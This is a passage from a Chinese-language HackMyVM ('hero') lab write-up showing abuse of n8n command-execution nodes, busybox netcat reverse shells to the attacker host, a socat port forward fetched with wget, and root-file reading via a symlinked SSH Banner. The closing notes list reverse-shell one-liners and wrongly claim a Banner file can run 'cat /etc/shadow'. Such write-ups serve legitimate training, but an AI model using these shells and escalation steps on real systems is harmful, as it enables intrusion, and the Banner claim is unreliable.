title="n8n渗透"></a>n8n渗透</h2><p>（1）在 Overview 里面找到 Credentials ，新增 shawa 账号和刚才的 key 。IP 注意不能是 localhost 或者 127.0.0.1，因为是在Docker 里面，使用<code>172.17.0.1</code><br>    为什么是<code>172.17.0.1</code>？<br>    在Workflow 里面创建一个 Workflow ，节点选<code>Execute Command</code>，就可以进行命令执行，执行命令<code>ifconfig</code>，就可以知道靶机所在的IP是172的。<br>    同时在节点<code>Execute Command</code>执行反弹shell后，获取到的<code>id</code>是<code>node</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502072154216.png"></p><ul><li>提示Connection tested successfully ，就说明成功啦<br>（2）在Workflow 里面创建一个 Workflow ，节点选 SSH，就可以 Test 命令了，随便试了两个命令都能正常执行<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502072157384.png"><br>（3）反弹shell<br>尝试bash反弹，发现没有找到bash，说明没有bash；经过尝试发现可以使用busybox进行反弹shell<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">busybox  nc 192.168.2.4 4444 -e /bin/sh <br></code></pre></td></tr></table></figure>成功进行反弹<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.9] 37397<br><span class="hljs-built_in">id</span><br>uid=1000(shawa) gid=1000(shawa) <span class="hljs-built_in">groups</span>=1000(shawa)<br></code></pre></td></tr></table></figure></li></ul><h1 id="建立稳定的shell"><a href="#建立稳定的shell" class="headerlink" title="建立稳定的shell"></a>建立稳定的shell</h1><p>成功进行反弹后，发现所获得的shell并不是一个稳定的shell，所以需要使用建立一个稳定的shell<br>（1）使用socat将22端口反弹到2222端口<br>kali上开启web服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -S 0.0.0.0 80<br></code></pre></td></tr></table></figure><p>shell中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/shawa<br>wget 192.168.2.4/socat<br>chomd +x socat<br>./socat TCP-LISTEN:2222,fork TCP4:172.17.0.1:22 &amp;<br></code></pre></td></tr></table></figure><p>（2）使用ssh登录，获得稳定的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ ssh shawa@192.168.2.9 -i id_rsa -p 2222 <br>The authenticity of host <span class="hljs-string">&#x27;[192.168.2.9]:2222 ([192.168.2.9]:2222)&#x27;</span> can<span class="hljs-string">&#x27;t be established.&#x27;</span><br>ED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.<br>This host key is known by the following other names/addresses:<br>    ~/.ssh/known_hosts:3: [hashed name]<br>Are you sure you want to <span class="hljs-built_in">continue</span> connecting (<span class="hljs-built_in">yes</span>/no/[fingerprint])? <span class="hljs-built_in">yes</span><br>Warning: Permanently added <span class="hljs-string">&#x27;[192.168.2.9]:2222&#x27;</span> (ED25519) to the list of known hosts.<br>shawa was here.<br>Welcome to Alpine!<br><br>The Alpine Wiki contains a large amount of how-to guides and general<br>information about administrating Alpine systems.<br>See &lt;https://wiki.alpinelinux.org/&gt;.<br><br>You can setup the system with the <span class="hljs-built_in">command</span>: setup-alpine<br><br>You may change this message by editing /etc/motd.<br><br>hero:~$ <span class="hljs-built_in">cat</span> user.txt<br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>（1）查看<code>sshd_config</code>，发现<code>Banner /opt/banner.txt</code>，进行查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hero:~$ <span class="hljs-built_in">cat</span> /opt/banner.txt <br>shawa was here.<br>hero:~$ <span class="hljs-built_in">ls</span> -la /opt/banner.txt <br>-rw-rw-rw-    1 root     root            16 Feb  6 10:09 /opt/banner.txt<br></code></pre></td></tr></table></figure><p>发现该文件是以<code>root</code>权限进行读写的<br>（2）使用软链接进行提权，将<code>/root/root.tx</code>中的内容写入到<code>banner.txt</code>中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hero:~$ <span class="hljs-built_in">rm</span> -rf /opt/*<br>hero:~$ <span class="hljs-built_in">ln</span> -s /root/root.txt /opt/banner.txt<br></code></pre></td></tr></table></figure><p>（3）使用<code>root</code>登录ssh，即可读取<code>/root/root.txt</code>中的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">hero:~$ ssh root@172.17.0.1<br>The authenticity of host <span class="hljs-string">&#x27;172.17.0.1 (172.17.0.1)&#x27;</span> cant be established.<br>ED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.<br>This key is not known by any other names.<br>Are you sure you want to <span class="hljs-built_in">continue</span> connecting (<span class="hljs-built_in">yes</span>/no/[fingerprint])? <span class="hljs-built_in">yes</span><br>Warning: Permanently added <span class="hljs-string">&#x27;172.17.0.1&#x27;</span> (ED25519) to the list of known hosts.<br>HMVNOTINPRODLOL<br>root@172.17.0.1<span class="hljs-string">&#x27;s password: </span><br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="SSH如何从私钥中提取公钥"><a href="#SSH如何从私钥中提取公钥" class="headerlink" title="SSH如何从私钥中提取公钥"></a>SSH如何从私钥中提取公钥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -y -f 私钥文件名<br></code></pre></td></tr></table></figure><ul><li>**<code>ssh-keygen</code>**：这是生成、管理和转换 SSH 密钥的工具。  </li><li>**<code>-y</code>**：该选项指示 <code>ssh-keygen</code> 从私钥文件中提取公钥。</li><li>**<code>-f id_rsa</code>**：指定私钥文件的路径，这里假设私钥文件名为 <code>id_rsa</code>。</li></ul><h2 id="n8n渗透-1"><a href="#n8n渗透-1" class="headerlink" title="n8n渗透"></a>n8n渗透</h2><p>n8n介绍：<a href="https://github.com/n8n-io/n8n">https://github.com/n8n-io/n8n</a><br>在n8n中<code>workflow</code>里面的工作流，节点<code>ssh</code>可以进行命令执行，但是需要在<code>credentials</code>创建<code>ssh private key account</code>，需要知道相关的<code>username</code>和<code>private key</code><br>同时还有一个节点<code>Execute Command</code>也可以进行命令执行，不需要任何的参数</p><h2 id="busyfox反弹shell"><a href="#busyfox反弹shell" class="headerlink" title="busyfox反弹shell"></a>busyfox反弹shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">busyfox nc &lt;攻击者IP&gt; 4444 -e /bin/sh<br>busyfox /bin/sh -i &gt; /dev/tcp/&lt;攻击者IP&gt;/4444 0&lt;&amp;1 2&gt;&amp;1<br>busyfox telnet &lt;攻击者IP&gt; 4444 | /bin/sh | telnet &lt;攻击者IP&gt; 4445<br></code></pre></td></tr></table></figure><h2 id="如何通过-Banner-读取-root-权限的文件"><a href="#如何通过-Banner-读取-root-权限的文件" class="headerlink" title="如何通过 Banner 读取 root 权限的文件"></a>如何通过 <code>Banner</code> 读取 root 权限的文件</h2><p><code>Banner</code> 是一个用于设置自定义登录横幅（Login Banner）的选项。当用户成功连接到 SSH 服务器但尚未登录时，服务器会显示这个横幅信息。<br>存在于配置文件<code>sshd_config</code>中</p><p>如果你确实需要通过 <code>Banner</code> 读取 root 权限的文件（例如用于测试或调试），可以按照以下步骤操作：</p><h4 id="步骤-1：创建-Banner-文件"><a href="#步骤-1：创建-Banner-文件" class="headerlink" title="步骤 1：创建 Banner 文件"></a><strong>步骤 1：创建 Banner 文件</strong></h4><ul><li>创建一个 Banner 文件（如 <code>/etc/ssh/banner.txt</code>）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/ssh/banner.txt<br></code></pre></td></tr></table></figure></li><li>在文件中添加以下内容，使用 <code>cat</code> 命令读取目标文件（如 <code>/etc/shadow</code>）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shadow<br></code></pre></td></tr></table></figure></li></ul><h4 id="步骤-2：修改-sshd-config"><a href="#步骤-2：修改-sshd-config" class="headerlink" title="步骤 2：修改 sshd_config"></a><strong>步骤 2：修改 <code>sshd_config</code></strong></h4><ul><li>打开 SSH 配置文件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/ssh/sshd_config<br></code></pre></td></tr></table></figure></li><li>添加或修改 <code>Banner</code> 选项，指向刚刚创建的文件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Banner /etc/ssh/banner.txt<br></code></pre></td></tr></table></figure></li></ul><h4 id="步骤-3：重启-SSH-服务"><a href="#步骤-3：重启-SSH-服务" class="headerlink" title="步骤 3：重启 SSH 服务"></a><strong>步骤 3：重启 SSH 服务</strong></h4><ul><li>重启 SSH 服务以使配置生效：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart sshd<br></code></pre></td></tr></table></figure></li></ul><h4 id="步骤-4：测试连接"><a href="#步骤-4：测试连接" class="headerlink" title="步骤 4：测试连接"></a><strong>步骤 4：测试连接</strong></h4><ul><li>使用 SSH 客户端连接到服务器：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh user@your_server_ip<br></code></pre></td></tr></table></figure></li><li>如果配置正确，连接时会显示目标文件的内容（如 <code>/etc/shadow</code>）。</li></ul>]]></content>
    
    
    <categories>
      
      <category>hackmyvm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>n8n</tag>
      
      <tag>提权-Banner</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
